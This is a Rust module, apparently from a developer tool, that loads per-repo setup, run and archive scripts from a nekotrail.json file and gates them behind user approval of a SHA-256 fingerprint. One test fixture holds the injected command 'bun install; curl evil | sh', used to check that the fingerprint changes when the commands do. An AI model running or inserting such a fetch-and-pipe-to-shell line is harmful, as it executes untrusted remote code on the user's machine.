//! Per-repo scripts. A `nekotrail.json` committed in the repo wins over the
//! scripts saved in the app, so the whole team shares one setup. Its commands run only after the
//! user approved their exact text for that repo (see `file_commands`).
//!
//! ```json
//! { "scripts": { "setup": "bun install", "run": "bun dev", "archive": "docker compose down" } }
//! ```

use serde::{Deserialize, Serialize};
use std::path::Path;

#[derive(Debug, Default, Clone, Serialize, Deserialize, PartialEq)]
pub struct Scripts {
    pub setup: Option<String>,
    pub run: Option<String>,
    pub archive: Option<String>,
}

#[derive(Deserialize)]
struct File {
    #[serde(default)]
    scripts: Scripts,
}

pub fn from_file(dir: &Path) -> Option<Scripts> {
    let text = std::fs::read_to_string(dir.join("nekotrail.json")).ok()?;
    serde_json::from_str::<File>(&text).ok().map(|f| f.scripts)
}

fn nonempty(s: Option<String>) -> Option<String> {
    s.filter(|s| !s.trim().is_empty())
}

/// File values first, app-saved values as fallback.
pub fn resolve(dir: &Path, saved: Scripts) -> Scripts {
    let f = from_file(dir).unwrap_or_default();
    Scripts {
        setup: nonempty(f.setup).or(nonempty(saved.setup)),
        run: nonempty(f.run).or(nonempty(saved.run)),
        archive: nonempty(f.archive).or(nonempty(saved.archive)),
    }
}

/// The commands a repo's own `nekotrail.json` asks to run, and a fingerprint of exactly those
/// commands. None when the file has none. Anyone who can push to the repo (or open a PR) writes
/// this file, so these run only after the user approves this fingerprint.
pub fn file_commands(dir: &Path) -> Option<(Scripts, String)> {
    let f = from_file(dir)?;
    let s = Scripts { setup: nonempty(f.setup), run: nonempty(f.run), archive: nonempty(f.archive) };
    if s == Scripts::default() {
        return None;
    }
    let print = fingerprint(&s);
    Some((s, print))
}

/// SHA-256 over the three commands, each length-prefixed so no two different sets collide.
pub fn fingerprint(s: &Scripts) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    for part in [&s.setup, &s.run, &s.archive] {
        match part {
            Some(c) => {
                h.update([1u8]);
                h.update((c.len() as u64).to_le_bytes());
                h.update(c.as_bytes());
            }
            None => h.update([0u8]),
        }
    }
    h.finalize().iter().map(|b| format!("{b:02x}")).collect()
}

/// Settings key under which an approved fingerprint is kept for a repo.
pub fn trust_key(repo_id: &str, fingerprint: &str) -> String {
    format!("trusted_scripts:{repo_id}:{fingerprint}")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn file_wins_and_saved_fills_gaps() {
        let d = tempfile::tempdir().unwrap();
        std::fs::write(d.path().join("nekotrail.json"), r#"{"scripts":{"setup":"bun install","run":""}}"#).unwrap();
        let saved = Scripts { setup: Some("npm i".into()), run: Some("npm start".into()), archive: None };
        assert_eq!(
            resolve(d.path(), saved),
            Scripts { setup: Some("bun install".into()), run: Some("npm start".into()), archive: None }
        );
    }

    #[test]
    fn file_commands_fingerprint_changes_with_any_command() {
        let d = tempfile::tempdir().unwrap();
        assert!(file_commands(d.path()).is_none(), "no file, nothing to approve");
        std::fs::write(d.path().join("nekotrail.json"), r#"{"scripts":{"setup":"  ","run":""}}"#).unwrap();
        assert!(file_commands(d.path()).is_none(), "only empty commands, nothing to approve");
        std::fs::write(d.path().join("nekotrail.json"), r#"{"scripts":{"setup":"bun install","run":"bun dev"}}"#).unwrap();
        let (s, a) = file_commands(d.path()).unwrap();
        assert_eq!(s, Scripts { setup: Some("bun install".into()), run: Some("bun dev".into()), archive: None });
        assert_eq!(a.len(), 64);
        assert_eq!(file_commands(d.path()).unwrap().1, a, "stable for the same file");
        std::fs::write(d.path().join("nekotrail.json"), r#"{"scripts":{"setup":"bun install; curl evil | sh","run":"bun dev"}}"#).unwrap();
        assert_ne!(file_commands(d.path()).unwrap().1, a);
        // Moving text between commands is a different set of commands.
        let x = Scripts { setup: Some("ab".into()), run: Some("c".into()), archive: None };
        let y = Scripts { setup: Some("a".into()), run: Some("bc".into()), archive: None };
        assert_ne!(fingerprint(&x), fingerprint(&y));
        let only = |run: bool| if run { Scripts { run: Some("x".into()), ..Default::default() } } else { Scripts { archive: Some("x".into()), ..Default::default() } };
        assert_ne!(fingerprint(&only(true)), fingerprint(&only(false)));
        assert_eq!(trust_key("r1", "ff"), "trusted_scripts:r1:ff");
    }

    #[test]
    fn missing_or_broken_file_uses_saved() {
        let d = tempfile::tempdir().unwrap();
        let saved = Scripts { setup: Some("make".into()), ..Default::default() };
        assert_eq!(resolve(d.path(), saved.clone()), saved);
        std::fs::write(d.path().join("nekotrail.json"), "{oops").unwrap();
        assert_eq!(resolve(d.path(), saved.clone()), saved);
    }
}
